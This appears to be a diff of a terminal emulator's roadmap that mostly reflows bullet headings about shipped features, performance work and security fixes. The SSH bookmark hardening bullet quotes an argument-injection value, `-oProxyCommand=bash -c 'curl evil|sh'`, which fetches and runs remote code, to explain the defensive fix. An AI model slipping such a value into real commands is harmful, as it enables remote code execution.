@@ -1014,8 +1014,7 @@ for the rotation contract.
   exit-code-mismatched HMACs. See
   [CHANGELOG.md §0.6.31](CHANGELOG.md#0631--2026-04-17).
 
-- ✅ [ANTS-1330] **Floating prompt-jump button in scrollback —
-  visual companion to the back-to-bottom chip.** User request
+- ✅ [ANTS-1330] **Floating prompt-jump button in scrollback — visual companion to the back-to-bottom chip.** User request
   2026-05-14. Add a small floating chip (styled like the
   scroll-to-bottom chip — circular, ID-scoped stylesheet so it
   resists the app `QPushButton` cascade, see ANTS-1326) that
@@ -1046,8 +1045,7 @@ for the rotation contract.
   integration sprint.
   Resolved (2026-07-13): shipped the two floating prompt-jump chips (↑ previous / ↓ next) as m_promptPrevBtn/m_promptNextBtn in TerminalWidget, stacked above the scroll-to-bottom chip, shown when scrolled up AND at least one OSC 133 prompt exists. Click handlers reuse navigatePrompt(-1)/(1); theming reuses styleScrollToBottomButton (per-chip ID-scoped reset, ANTS-1326); positioning reuses updateScrollToBottomButton's local x/y (search-bar shift inherited). Design spec docs/specs/ANTS-1330.md cold-eyes-clean (5 loops). Test-first: tests/features/prompt_jump_chip/ (PromptJumpChip.Main, 18 invariants) written red against the feature-absent tree then driven green; existing scroll_to_bottom_chip_size stays green after the styler refactor. Full suite 2626/2626. Goes live on relaunch.
 
-- ✅ [ANTS-1371] **Menu-bar "Sponsors" entry → opens GitHub
-  Sponsors page.** User request 2026-05-14. (Renumbered from
+- ✅ [ANTS-1371] **Menu-bar "Sponsors" entry → opens GitHub Sponsors page.** User request 2026-05-14. (Renumbered from
   ANTS-1331 on 2026-05-14 to resolve a pre-existing duplicate
   with ROADMAP.md:6644 "Prev/next prompt-history navigation.") Add a top-level
   menu item after "Help" in `MainWindow`'s menu bar that opens
@@ -1338,8 +1336,7 @@ item carries the dimension tag (⚡ perf, 🔒 security, 🐛 bug,
   grow-back would attach the span to a row whose content no longer
   matched. Now: both fields are `std::clamp`'d on every resize, same
   as `m_cursorRow/Col`.
-- ✅ **🔒 SSH bookmark argv-injection hardening (CVE-2017-1000117
-  class).** `SshBookmark::toSshCommand` now inserts `--` before the
+- ✅ **🔒 SSH bookmark argv-injection hardening (CVE-2017-1000117 class).** `SshBookmark::toSshCommand` now inserts `--` before the
   host argument, stopping OpenSSH from parsing a host whose value
   begins with `-` as an option (classic
   `-oProxyCommand=bash -c 'curl evil|sh'` trick). Shell-quoting alone
@@ -1460,8 +1457,7 @@ item carries the dimension tag (⚡ perf, 🔒 security, 🐛 bug,
   improved; `utf8_cjk` also gained +12 %. First perf result to
   validate the 0.7.9 thesis that the container shuffle was a red
   herring and the allocator was the actual hot spot.
-- ✅ **⚡ Per-frame `QString` construction in the text-run accumulator
-  (shipped 0.7.9).** `QString::fromUcs4()` used to be called per
+- ✅ **⚡ Per-frame `QString` construction in the text-run accumulator (shipped 0.7.9).** `QString::fromUcs4()` used to be called per
   non-space cell in both `TerminalWidget::paintEvent` and
   `GlRenderer::render`; the run was then built via repeated
   `QString::operator+=`. Reworked to accumulate codepoints into a
@@ -1469,8 +1465,7 @@ item carries the dimension tag (⚡ perf, 🔒 security, 🐛 bug,
   `QString::fromUcs4(data, size)` exactly once at run-push time. The
   vector is reused across runs within a frame (cleared on push), so
   steady-state allocation is amortised.
-- ✅ **⚡ Combining-char map in-place key remap on `deleteChars` /
-  `insertBlanks` (shipped 0.7.11).** Old impl built a new
+- ✅ **⚡ Combining-char map in-place key remap on `deleteChars` / `insertBlanks` (shipped 0.7.11).** Old impl built a new
   `unordered_map` then move-assigned it, re-hashing every surviving
   entry and reallocating buckets. Rewrote to use node-handle
   `extract()` + key-mutate + `insert()`: the map's nodes are detached,
@@ -1689,8 +1684,7 @@ bundle's theme, fold it in rather than spinning up a new release.
   `"raw": true` in the request JSON. Closes the UID-scope keystroke-
   injection RCE chain. Regression test:
   `tests/features/remote_control_opt_in/`.
-- ✅ **Parse-failure-overwrites-data — Config + Allowlist + shared
-  helper.** `Config::load()` now distinguishes fresh-run / valid /
+- ✅ **Parse-failure-overwrites-data — Config + Allowlist + shared helper.** `Config::load()` now distinguishes fresh-run / valid /
   corrupt. On corrupt, the on-disk file is rotated to
   `config.json.corrupt-<ms_timestamp>[-N]` via the new shared
   `rotateCorruptFileAside()` helper (secureio.h) with a
@@ -1963,8 +1957,7 @@ bundle's theme, fold it in rather than spinning up a new release.
   Bundled with the qUncompress pre-flight + cell-loop status checks
   below as the 0.7.30 "Session-file integrity" release. Regression
   test `tests/features/session_sha256_checksum` (4 invariants).
-- ✅ **Session file: pre-validate compressed length prefix before
-  `qUncompress`.** Shipped 0.7.30. `restore` reads the first 4 bytes
+- ✅ **Session file: pre-validate compressed length prefix before `qUncompress`.** Shipped 0.7.30. `restore` reads the first 4 bytes
   of the compressed payload, reconstructs the big-endian uint32, and
   rejects any claim above `MAX_UNCOMPRESSED` (500 MB) BEFORE
   `qUncompress` runs — constant-time, no allocator pressure. Short-
@@ -2056,8 +2049,7 @@ bundle's theme, fold it in rather than spinning up a new release.
   files complicate cleanup and overflow itself indicates a broken
   tool worth surfacing rather than hiding. Locked by
   `tests/features/audit_incremental_output_drain` (6 invariants).
-- ✅ **Audit: regex-DoS watchdog on user `drop_if_matches` /
-  `.audit_allowlist.json`.** Shipped 0.7.29. Two-layer defense:
+- ✅ **Audit: regex-DoS watchdog on user `drop_if_matches` / `.audit_allowlist.json`.** Shipped 0.7.29. Two-layer defense:
   static `isCatastrophicRegex` heuristic rejects nested-quantifier
   shapes (`(.+)+`, `(\w*)*`, `(.*)+`) at compile time with a qWarning
   naming the offending pattern; surviving patterns are wrapped in
@@ -2083,8 +2075,7 @@ bundle's theme, fold it in rather than spinning up a new release.
   `m_suppressedKeys.contains(f.dedupKey)` now route through the
   helper. Locked by `tests/features/audit_dedup_96bit`
   (4 invariants).
-- ✅ **Audit: distinguish "tool exited non-zero with empty stdout"
-  from "tool reported no findings".** Shipped 0.7.28.
+- ✅ **Audit: distinguish "tool exited non-zero with empty stdout" from "tool reported no findings".** Shipped 0.7.28.
   `onCheckFinished`'s parameters are now named (`exitCode`,
   `exitStatus`) and the function branches on `QProcess::CrashExit`
   to emit a "Tool crashed (signal exit)" warning, on
@@ -2119,8 +2110,7 @@ bundle's theme, fold it in rather than spinning up a new release.
   4 invariants (fresh open under umask 0022 → 0600, clear+reopen
   preserves 0600, pre-existing 0644 narrowed, source uses the
   helper).
-- ✅ **Claude transcript: 32 KB tail window → scan-for-first-newline +
-  grow.** Shipped 0.7.14. Replaced the fixed 32 KB window +
+- ✅ **Claude transcript: 32 KB tail window → scan-for-first-newline + grow.** Shipped 0.7.14. Replaced the fixed 32 KB window +
   firstLine-skip with a doubling-grow loop (32 KB → 4 MiB cap) that
   trims the potentially-partial prefix line only when the buffer
   contains ≥ 2 newlines, guaranteeing real content remains for the
@@ -2364,8 +2354,7 @@ remainder, captured so they don't drop on the floor.
 
 ### 🎨 Claude Code UX — unified state-dot palette (user request 2026-04-27)
 
-- ✅ **Single round dot per tab, colour-only differentiation, palette
-  extended to status bar.** Shipped 0.7.39. User ask: "a round dot
+- ✅ **Single round dot per tab, colour-only differentiation, palette extended to status bar.** Shipped 0.7.39. User ask: "a round dot
   on each tab that has a Claude Code session running (no icons or
   anything else other than the tab label). The dot will change
   colour with the various states that Claude Code is in. Each state
@@ -2862,8 +2851,7 @@ flagged by ≥2 independent reviewers regardless of which lane:
 
 ### 🐛 Regressions reported post-0.7.49 (user, 2026-04-27)
 
-- ✅ **HIGH — GitHub repo-type chip (Public/Private) not showing
-  at all.** Resolved as of 2026-04-28 (user confirmed via screenshot
+- ✅ **HIGH — GitHub repo-type chip (Public/Private) not showing at all.** Resolved as of 2026-04-28 (user confirmed via screenshot
   showing the "Public" badge alongside the `main` branch chip on the
   status bar's left side). The chip became visible after the 0.7.50
   / 0.7.51 release cycle landed; the original suspicion (placement-
@@ -2873,8 +2861,7 @@ flagged by ≥2 independent reviewers regardless of which lane:
   asserts the call shape but does not check runtime visibility —
   worth extending the next time the GitHub-status-bar lane is
   touched (deferred to T2 hardening, separate item).
-- ✅ **HIGH — Status-bar transient notification stuck on "Config
-  reloaded from disk".** Shipped in 0.7.51 — root cause was the
+- ✅ **HIGH — Status-bar transient notification stuck on "Config reloaded from disk".** Shipped in 0.7.51 — root cause was the
   config-watcher firing in a tight loop (the second of the two
   hypotheses in the original entry). `Config::setTheme` rewrote the
   watched file even when the value matched, so any
@@ -2890,8 +2877,7 @@ All Tier 1 items shipped between 0.7.52 and 0.7.53 — see CHANGELOG
 sections of those releases for the inline narrative. Source comments
 in each named file carry the original indie-review citation.
 
-- ✅ [ANTS-1015] **CRITICAL — Update-confirmation dialog same KDE/KWin frameless
-  regression.** Shipped 0.7.52 — `mainwindow.cpp:5405` converted to
+- ✅ [ANTS-1015] **CRITICAL — Update-confirmation dialog same KDE/KWin frameless regression.** Shipped 0.7.52 — `mainwindow.cpp:5405` converted to
   heap+`WA_DeleteOnClose`+`show()`+`raise()`+`activateWindow()`,
   mirroring the 0.7.49 About-dialog pattern.
   Kind: review-fix.
@@ -2908,8 +2894,7 @@ in each named file carry the original indie-review citation.
   suppress) also migrated to QSaveFile in the same pass.
   Kind: review-fix.
   Source: indie-review-2026-04-27.
-- ✅ [ANTS-1018] **HIGH — `new-tab` / `launch` IPC commands bypass `send-text` C0
-  filter.** Shipped 0.7.52 — `remotecontrol.cpp:393, 442` route
+- ✅ [ANTS-1018] **HIGH — `new-tab` / `launch` IPC commands bypass `send-text` C0 filter.** Shipped 0.7.52 — `remotecontrol.cpp:393, 442` route
   `command` through `filterControlChars` with the same `raw: true`
   opt-out as `send-text`.
   Kind: review-fix.
@@ -2964,8 +2949,7 @@ in each named file carry the original indie-review citation.
   parser tracks the colonSep slot. See `terminalgrid.h:384`.
   Kind: review-fix.
   Source: indie-review-2026-04-27.
-- ✅ [ANTS-1027] **Image-paste `m_imagePasteDir` not path-validated; filename
-  injected to PTY.** Shipped 0.7.53 — `terminalwidget.cpp:1441` adds
+- ✅ [ANTS-1027] **Image-paste `m_imagePasteDir` not path-validated; filename injected to PTY.** Shipped 0.7.53 — `terminalwidget.cpp:1441` adds
   the canonicalize-and-reject-non-writable guard plus a UUID4 suffix
   on the saved filename.
   Kind: review-fix.
@@ -2976,8 +2960,7 @@ in each named file carry the original indie-review citation.
   flag.
   Kind: review-fix.
   Source: indie-review-2026-04-27.
-- ✅ [ANTS-1029] **Paste preview splits on LF only — CR-only payload spoofs
-  the dialog.** Shipped 0.7.53 — `terminalwidget.cpp:2105` normalizes
+- ✅ [ANTS-1029] **Paste preview splits on LF only — CR-only payload spoofs the dialog.** Shipped 0.7.53 — `terminalwidget.cpp:2105` normalizes
   CR→LF for the preview only; the actual write keeps original bytes.
   Kind: review-fix.
   Source: indie-review-2026-04-27.
@@ -3093,8 +3076,7 @@ in each named file carry the original indie-review citation.
   Layman: Split the code-checking screen's oversized source file into smaller pieces.
   Kind: review-fix.
   Source: indie-review-2026-04-27.
-- ✅ [ANTS-1045] **`XcbPositionTracker` rename + Wayland-non-KWin abort + temp-
-  file leak fix.** Shipped 2026-04-30 (post-0.7.60). Class +
+- ✅ [ANTS-1045] **`XcbPositionTracker` rename + Wayland-non-KWin abort + temp- file leak fix.** Shipped 2026-04-30 (post-0.7.60). Class +
   files renamed to `KWinPositionTracker` /
   `kwinpositiontracker.{h,cpp}`. KWin-presence guard checks
   `KDE_FULL_SESSION=true` OR `XDG_CURRENT_DESKTOP` containing
@@ -3529,8 +3511,7 @@ minor tag (next: pre-0.8.0).
   folded inline).
   Kind: fix.
   Source: regression.
-- ✅ [ANTS-1051] **Modal-style "behind the dialog is inert" semantics under the
-  KDE/KWin/Wayland constraint.** Shipped 2026-04-30. Implemented
+- ✅ [ANTS-1051] **Modal-style "behind the dialog is inert" semantics under the KDE/KWin/Wayland constraint.** Shipped 2026-04-30. Implemented
   via the existing qApp eventFilter (already installed in
   ANTS-1050) plus a new pure-logic helper
   `dialogfocus::shouldSuppressEventForDialog(watched, event)`.
@@ -3562,8 +3543,7 @@ minor tag (next: pre-0.8.0).
   Lanes: MainWindow, dialogfocus.
   Kind: fix.
   Source: regression.
-- ✅ [ANTS-1052] **HIGH — Background-tasks status-bar button regressed:
-  no longer shows up.** Resolved 2026-05-08 by ANTS-1192 (commit
+- ✅ [ANTS-1052] **HIGH — Background-tasks status-bar button regressed: no longer shows up.** Resolved 2026-05-08 by ANTS-1192 (commit
   `2424fb3`). The diagnostic logging shipped earlier (`ANTS_DEBUG=claude`
   traces `refreshBgTasksButton`) finally produced its repro on
   2026-05-08: every refresh tick logged `path=(empty)` because
@@ -3892,8 +3872,7 @@ minor tag (next: pre-0.8.0).
 
 ### 🔍 CI fold-in (2026-04-28)
 
-- ✅ [ANTS-1869] **UBSan vptr error in `DialogChrome::ChromeGuard::eventFilter`
-  reded every dialog test under the sanitizer build (~40 tests).**
+- ✅ [ANTS-1869] **UBSan vptr error in `DialogChrome::ChromeGuard::eventFilter` reded every dialog test under the sanitizer build (~40 tests).**
   The guard's identity check `if (obj == m_dlg)` compared a
   `QPointer<QDialog>` against the filtered object. Events still flow to the
   filter while the dialog is mid-destruction — a `~QVBoxLayout`
@@ -3913,8 +3892,7 @@ minor tag (next: pre-0.8.0).
   Lanes: dialogchrome, dialogs.
   Source: ci-failure-2026-05-25 (build-asan dialog cluster, found while fixing ANTS-1867).
 
-- ✅ [ANTS-1867] **`findClaudeChildPid` missed a Claude child forked from a
-  non-leader thread → `ClaudeTranscriptRobustness` red on CI.**
+- ✅ [ANTS-1867] **`findClaudeChildPid` missed a Claude child forked from a non-leader thread → `ClaudeTranscriptRobustness` red on CI.**
   The kernel `/proc/<pid>/task/<tid>/children` file is per-THREAD. The fast
   path read only the thread-group leader's file (`task/<pid>/children`) and
   `return 0`'d on no match *without* consulting the `/proc`-scan fallback.
@@ -3942,8 +3920,7 @@ minor tag (next: pre-0.8.0).
   Lanes: claudeintegration.
   Source: ci-failure-2026-05-25 (ClaudeTranscriptRobustness red on main).
 
-- ✅ [ANTS-1099] **Unescaped `&` in 0.7.55 metainfo `<release>` body
-  broke `appstreamcli validate`.** CI's "Validate AppStream metainfo"
+- ✅ [ANTS-1099] **Unescaped `&` in 0.7.55 metainfo `<release>` body broke `appstreamcli validate`.** CI's "Validate AppStream metainfo"
   step has been red on every commit since the 0.7.55 release
   (`packaging/linux/org.ants.Terminal.metainfo.xml:116` —
   `Now returns const &.`). Fix: escape as `&`. Other `&` in the
@@ -3958,8 +3935,7 @@ minor tag (next: pre-0.8.0).
 
 ### 🎨 Roadmap viewer — enhancement bundle + format standard (user request 2026-04-28)
 
-- ✅ [ANTS-1055] **Public ROADMAP.md format standard + four-doc
-  shareable standards bundle.** Shipped 2026-04-28. Original ask:
+- ✅ [ANTS-1055] **Public ROADMAP.md format standard + four-doc shareable standards bundle.** Shipped 2026-04-28. Original ask:
   "come up with a standard for roadmap.md that we can share with
   Claude Code sessions to ensure that the roadmap is written in
   that format for this terminal to show it off better and in a
@@ -3987,8 +3963,7 @@ minor tag (next: pre-0.8.0).
   ANTS-1104.) Lanes: docs, ROADMAP, README, CHANGELOG.
   Kind: implement.
   Source: user-2026-04-28.
-- ✅ [ANTS-1105] **Retire deprecated top-level `STANDARDS.md` and
-  `RULES.md`.** Shipped 2026-04-30 (user authorised the destructive
+- ✅ [ANTS-1105] **Retire deprecated top-level `STANDARDS.md` and `RULES.md`.** Shipped 2026-04-30 (user authorised the destructive
   removal). `git rm` of both files; live references updated in
   `CONTRIBUTING.md`, `PLUGINS.md`, `README.md` (project-structure
   tree + Claude review handoff prose), `docs/RECOMMENDED_ROUTINES.md`,
@@ -4000,8 +3975,7 @@ minor tag (next: pre-0.8.0).
   CHANGELOG references to the retired files are historical and
   stay unchanged. Kind: doc-fix.
   Source: debt-sweep-2026-04-30. Lanes: docs, src/auditdialog.
-- ✅ [ANTS-1104] **Sync `docs/standards/` to the App-Build suite
-  template.** Shipped 2026-04-30. The four-doc bundle was
+- ✅ [ANTS-1104] **Sync `docs/standards/` to the App-Build suite template.** Shipped 2026-04-30. The four-doc bundle was
   forked into the user-level template at
   `~/.claude/skills/app-workflow/templates/docs/standards/` for
   `/start-app` to scaffold; the template was then refined
@@ -4033,8 +4007,7 @@ minor tag (next: pre-0.8.0).
   (stable-ID immutability); body annotated, status emoji removed.
   Kind: doc-fix. Source: ADR-0002-2026-04-30.
 
-- ✅ [ANTS-1100] **Roadmap dialog redesign — faceted tabs +
-  search + larger window.** Shipped 2026-04-30 (0.7.59). User request 2026-04-30 (refines the
+- ✅ [ANTS-1100] **Roadmap dialog redesign — faceted tabs + search + larger window.** Shipped 2026-04-30 (0.7.59). User request 2026-04-30 (refines the
   earlier 2026-04-28 ask). Three coordinated changes to the
   `RoadmapDialog`:
 
@@ -4166,8 +4139,7 @@ minor tag (next: pre-0.8.0).
   Kind: implement.
   Source: user-2026-04-30.
 
-- ✅ [ANTS-1102] **Confirm-on-close for tabs running non-shell
-  processes.** User-emphasised priority ("the confirm alone will
+- ✅ [ANTS-1102] **Confirm-on-close for tabs running non-shell processes.** User-emphasised priority ("the confirm alone will
   help a lot"). Walks `/proc/<shellPid>/task/<shellPid>/children`
   transitively (cap 256 visited), comparing each descendant's
   `comm` against an 11-shell allowlist (`bash`, `zsh`, `fish`,
@@ -4192,8 +4164,7 @@ minor tag (next: pre-0.8.0).
   Kind: implement.
   Source: user-2026-04-30.
 
-- 💭 [ANTS-1103] **Generic UI-action undo / redo stack
-  (deferred).** A wider mechanism beyond tab-close: font-size
+- 💭 [ANTS-1103] **Generic UI-action undo / redo stack (deferred).** A wider mechanism beyond tab-close: font-size
   changes, theme-pick, layout splits, etc. Not recommended —
   Settings dialog already has Cancel/OK for everything it owns;
   the one remaining uncovered surface (tab-close) is handled by
@@ -4231,8 +4202,7 @@ minor tag (next: pre-0.8.0).
 > to triage, ask Claude to update the file" into one button
 > click. That's the win.
 
-- ✅ [ANTS-1106] **Mandatory `Kind:` field + viewer faceted
-  categorisation.** Shipped 2026-05-01 (0.7.64). Backfill across
+- ✅ [ANTS-1106] **Mandatory `Kind:` field + viewer faceted categorisation.** Shipped 2026-05-01 (0.7.64). Backfill across
   the active ROADMAP landed in 0.7.59 (`Kind:` lines on every
   bullet); standards doc (`docs/standards/roadmap-format.md`
   § 3.5.3) marks the field "**Required as of v1.1**". 0.7.64
@@ -4274,8 +4244,7 @@ minor tag (next: pre-0.8.0).
   round-trip. Kind: doc-fix. Source: user-2026-04-30. Lanes: docs,
   RoadmapDialog.
 
-- 📋 [ANTS-1107] **Adopt App-Build documentation folder
-  structure.** **Deferred — paired with ANTS-1108** (native App-
+- 📋 [ANTS-1107] **Adopt App-Build documentation folder structure.** **Deferred — paired with ANTS-1108** (native App-
   Build runner). The five new doc files this bullet creates
   (`docs/glossary.md`, `docs/known-issues.md`,
   `docs/audit-allowlist.md`, `docs/ideas.md`, `docs/design.md`)
@@ -4307,8 +4276,7 @@ minor tag (next: pre-0.8.0).
   one commit. Kind: doc. Source: user-2026-04-30. Lanes: docs.
   Layman: Add the standard set of project documentation files used by the App-Build workflow.
 
-- 📋 [ANTS-1108] **Native App-Build runner inside Ants Terminal
-  — the strategic token-saver.** **Deferred — needs design pass
+- 📋 [ANTS-1108] **Native App-Build runner inside Ants Terminal — the strategic token-saver.** **Deferred — needs design pass
   before scoping.** This is a multi-release feature (Workflow
   panel + step buttons + roadmap-fold templating + per-step state
   machine + .claude/workflow.md schema co-evolution); shipping it
@@ -4464,8 +4432,7 @@ minor tag (next: pre-0.8.0).
 > `/indie-review` orchestration so Claude is invoked only for
 > the per-lane judgment + optional synthesis.
 
-- 💭 [ANTS-1110] **Catalogue retired — re-shaped per
-  [ADR-0002](docs/decisions/0002-cold-eyes-companion-cleanup.md).**
+- 💭 [ANTS-1110] **Catalogue retired — re-shaped per [ADR-0002](docs/decisions/0002-cold-eyes-companion-cleanup.md).**
   The original 13-row "absorb every superpowers skill" table mixed
   mechanical-shape rows (e.g. `using-git-worktrees`) with judgment-
   shape rows (e.g. `verification-before-completion`,
@@ -4485,15 +4452,13 @@ minor tag (next: pre-0.8.0).
   Kind: research. Source: ADR-0002-2026-04-30.
   Lanes: TBD per future per-skill bullet.
 
-- ✅ [ANTS-1111] **Fold `/audit` triage into the Project Audit
-  tool — eliminate the LLM round-trip on the noise floor.**
+- ✅ [ANTS-1111] **Fold `/audit` triage into the Project Audit tool — eliminate the LLM round-trip on the noise floor.**
   *Shipped 2026-05-13 in 0.7.88 (v1: engine + foundation +
   alias + framework detect; UI affordances deferred to ANTS-1257).
   See [`docs/specs/ANTS-1111.md`](docs/specs/ANTS-1111.md) and
   [ADR-0003](docs/decisions/0003-cc-fold-relax-gate-and-draw-boundary.md).*
 
-- ✅ [ANTS-1257] **ANTS-1111 v2 — UI affordances on top of the
-  engine layer.** Shipped engine layer in 0.7.88 (ANTS-1111 v1)
+- ✅ [ANTS-1257] **ANTS-1111 v2 — UI affordances on top of the engine layer.** Shipped engine layer in 0.7.88 (ANTS-1111 v1)
   exposes `RoadmapFoldIn`, `AuditEngine::applyCorroborationShift`,
   `AuditEngine::templateRoadmapFoldInBlock`,
   `AuditHygiene::detectProjectFrameworks` /
@@ -4610,8 +4575,7 @@ minor tag (next: pre-0.8.0).
   Lanes: AuditDialog, audithygiene, featurecoverage, docs
   (audit-allowlist.md / .json).
 
-- ✅ [ANTS-1112] **Fold `/indie-review` orchestration into
-  Ants Terminal — Claude does only the judgment.**
+- ✅ [ANTS-1112] **Fold `/indie-review` orchestration into Ants Terminal — Claude does only the judgment.**
   *Shipped 2026-05-13 in 0.7.89 (v1: engine + 5 MCP tools
   `indie_review_partition` / `indie_review_brief` /
   `indie_review_corroborate` / `indie_review_synthesis_prompt` /
@@ -4619,8 +4583,7 @@ minor tag (next: pre-0.8.0).
   *See [`docs/specs/ANTS-1112.md`](docs/specs/ANTS-1112.md) and
   [ADR-0003](docs/decisions/0003-cc-fold-relax-gate-and-draw-boundary.md).*
 
-- ✅ [ANTS-1258] **ANTS-1112 v2 — Qt dialog for in-app indie
-  review.** v1 (0.7.89) shipped the engine layer + 5 MCP tools
+- ✅ [ANTS-1258] **ANTS-1112 v2 — Qt dialog for in-app indie review.** v1 (0.7.89) shipped the engine layer + 5 MCP tools
   that lift the mechanical halves of /indie-review into Ants;
   per-lane judgment + dispatch still live in Claude. v2 wraps
   the engine in a `IndieReviewDialog` for users who want to run
@@ -4746,8 +4709,7 @@ minor tag (next: pre-0.8.0).
   Lanes: AuditDialog, aidialog, MainWindow, docs
   (indie-review-partition.md), tests/features.
 
-- ✅ [ANTS-1113] **Fold `/debt-sweep` into the Project Audit
-  tool — four mechanical categories.** User ask 2026-04-30:
+- ✅ [ANTS-1113] **Fold `/debt-sweep` into the Project Audit tool — four mechanical categories.** User ask 2026-04-30:
   "incorporate /debt-sweep too, comprehensive but minimising
   false positives and token usage." The skill originally scanned
   five categories of post-feature drift; per
@@ -4820,8 +4782,7 @@ minor tag (next: pre-0.8.0).
   remotecontrol (4 cmdDebtSweep* methods), claudeintegration (4 tools/list
   entries), mainwindow (4 registerToolProvider lambdas), docs (spec).
 
-- ✅ [ANTS-1259] **ANTS-1113 v2 — Qt "Debt Sweep" tab in the
-  Project Audit dialog.** Per `docs/specs/ANTS-1113.md` § 1.1
+- ✅ [ANTS-1259] **ANTS-1113 v2 — Qt "Debt Sweep" tab in the Project Audit dialog.** Per `docs/specs/ANTS-1113.md` § 1.1
   v1/v2 split. v1 (0.7.90) shipped the engine + MCP surface;
   v2 wraps it in a tabbed Audit-dialog panel showing findings
   grouped by category (code_drift, test_coverage, doc_drift,
@@ -4836,8 +4797,7 @@ minor tag (next: pre-0.8.0).
   Source: spec-ANTS-1113-v2.
   Lanes: auditdialog, debtsweepengine, aidialog, ptyhandler.
 
-- 💭 [ANTS-1114] **Wishlist retired — re-shaped per
-  [ADR-0002](docs/decisions/0002-cold-eyes-companion-cleanup.md).**
+- 💭 [ANTS-1114] **Wishlist retired — re-shaped per [ADR-0002](docs/decisions/0002-cold-eyes-companion-cleanup.md).**
   The original 14-bullet "additional companion surfaces" wishlist
   had no leverage ranking and mixed token-saving items
   (Output sanitiser, Permission-hint learner) with UX features
@@ -4865,8 +4825,7 @@ minor tag (next: pre-0.8.0).
   Kind: research. Source: ADR-0002-2026-04-30.
   Lanes: TBD per future per-surface bullet.
 
-- ✅ [ANTS-1724] **Session-bootstrap MCP tool (`session_brief`) — orient a fresh
-  session in one call.** *Shipped 2026-05-21 in 0.7.92.*
+- ✅ [ANTS-1724] **Session-bootstrap MCP tool (`session_brief`) — orient a fresh session in one call.** *Shipped 2026-05-21 in 0.7.92.*
   The `/clear`-heavy workflow that saves tokens
   per-session now has a hidden cost at the *start* of every session:
   5–6 MCP calls are needed to orient (git status, active roadmap item,
@@ -4899,8 +4858,7 @@ minor tag (next: pre-0.8.0).
   Kind: implement. Source: user-2026-05-21.
   Lanes: remotecontrol, claudeintegration, auditcache, roadmapdialog.
 
-- ✅ [ANTS-1719] **Low-confidence finding auto-fix — fix the fixable,
-  surface the rest; nothing silently suppressed.** Premise correction
+- ✅ [ANTS-1719] **Low-confidence finding auto-fix — fix the fixable, surface the rest; nothing silently suppressed.** Premise correction
   (verified 2026-05-21): low-confidence (≤ 30) findings are **not**
   suppressed/hidden — they already render with a red pip. `suppressed`
   is a separate fingerprint-keyed mechanism (`.audit_suppress` /
@@ -4939,8 +4897,7 @@ minor tag (next: pre-0.8.0).
   Kind: implement. Source: user-2026-05-21.
   Lanes: auditengine, auditdialog, auditcache.
 
-- ✅ [ANTS-1720] **MCP response projection (`fields=` parameter) on
-  high-volume read tools.** Heavy read tools return their full payload
+- ✅ [ANTS-1720] **MCP response projection (`fields=` parameter) on high-volume read tools.** Heavy read tools return their full payload
   on every call even when the caller needs one field. A new optional
   `fields: ["f1","f2"]` parameter returns only the named top-level
   fields. No change to the response *schema* — absent fields are simply
@@ -4972,8 +4929,7 @@ minor tag (next: pre-0.8.0).
   Kind: implement. Source: user-2026-05-21.
   Lanes: remotecontrol, claudeintegration.
 
-- ✅ [ANTS-1721] **Cold-eyes v2 Qt dialog (`ColdEyesDialog`) — native
-  in-app doc review.** The cold-eyes MCP engine is fully shipped
+- ✅ [ANTS-1721] **Cold-eyes v2 Qt dialog (`ColdEyesDialog`) — native in-app doc review.** The cold-eyes MCP engine is fully shipped
   (`cold_eyes_partition`, `cold_eyes_brief`, `cold_eyes_single_doc`,
   `cold_eyes_cross_doc_diff`, `cold_eyes_fold_in` — ANTS-1411–1414).
   What's missing is the Qt dialog layer that ANTS-1258 provides for
@@ -5013,8 +4969,7 @@ minor tag (next: pre-0.8.0).
   without a model round-trip, and offers per-finding / narrative fold-in.
   Tools › Review › Cold-eyes Documentation Review.
 
-- ✅ [ANTS-1722] **Test-audit v2 Qt dialog (`TestAuditDialog`) — native
-  in-app test-suite review.** Mirrors ANTS-1721 for the test-audit
+- ✅ [ANTS-1722] **Test-audit v2 Qt dialog (`TestAuditDialog`) — native in-app test-suite review.** Mirrors ANTS-1721 for the test-audit
   family (`test_audit_partition`, `test_audit_brief`,
   `test_audit_synthesis_prompt`, `test_audit_fold_in` — all shipped).
   1. **Partition panel** — calls `test_audit_partition`; renders chunks
@@ -5052,8 +5007,7 @@ minor tag (next: pre-0.8.0).
   it `stale_token`) triggers a re-partition + retry. Tools › Review ›
   Test-suite Audit.
 
-- ✅ [ANTS-1731] **`BriefDispatch::inlineBodies` should tolerate
-  absolute paths under the project root.** Discovered while wiring
+- ✅ [ANTS-1731] **`BriefDispatch::inlineBodies` should tolerate absolute paths under the project root.** Discovered while wiring
   ANTS-1722: `TestAuditEngine` returns ABSOLUTE chunk paths, but
   `inlineBodies`/`inlineRelevantSections` build `projectPath + "/" +
   path`, so an absolute path becomes `…/proj//tmp/…`, fails
@@ -5066,8 +5020,7 @@ minor tag (next: pre-0.8.0).
   Kind: implement. Source: in-session-2026-05-21 (noticed integrating
   ANTS-1722). Lanes: briefdispatch, testauditdialog.
 
-- ✅ [ANTS-1723] **Workflow-state MCP tool — superpowers skill
-  context compression.** *Shipped 2026-05-21 in 0.7.92.*
+- ✅ [ANTS-1723] **Workflow-state MCP tool — superpowers skill context compression.** *Shipped 2026-05-21 in 0.7.92.*
   The superpowers skills (brainstorming,
   systematic-debugging, TDD, verification-before-completion, etc.)
   carry significant context overhead: every invocation re-reads the
@@ -5148,9 +5101,7 @@ minor tag (next: pre-0.8.0).
 
 ### ⚡ Performance — hot-path sweep (user request 2026-04-30)
 
-- 📋 [ANTS-1115] **Performance, performance, performance — full
-  hot-path sweep across the ten subsystems that determine
-  perceived speed.** **Deferred to 0.8.x.** Ten-row table is real
+- 📋 [ANTS-1115] **Performance, performance, performance — full hot-path sweep across the ten subsystems that determine perceived speed.** **Deferred to 0.8.x.** Ten-row table is real
   work that needs a dedicated release cycle and a benchmark
   baseline first (the table's "Expected win" column is unmeasured
   conjecture; without baselines the sweep can ship a "5×
@@ -5809,8 +5760,7 @@ deferred 0.8.x), ANTS-1781 (span-cache wipe + resize BlockingQueuedConnection).
 > swap ANTS-1116 / ANTS-1117 priority order. Specs at
 > `docs/specs/ANTS-1119.md` and `docs/specs/ANTS-1120.md`.
 
-- ✅ [ANTS-1119] **HIGH — Extract audit logic into a GUI-free
-  engine module.** Shipped 2026-04-30 (0.7.59). Pure refactor: lift the engine + triage halves
+- ✅ [ANTS-1119] **HIGH — Extract audit logic into a GUI-free engine module.** Shipped 2026-04-30 (0.7.59). Pure refactor: lift the engine + triage halves
   of `auditdialog.cpp` (~5000 lines, mixed presentation +
   orchestration) into a new `src/auditengine.{h,cpp}` depending on
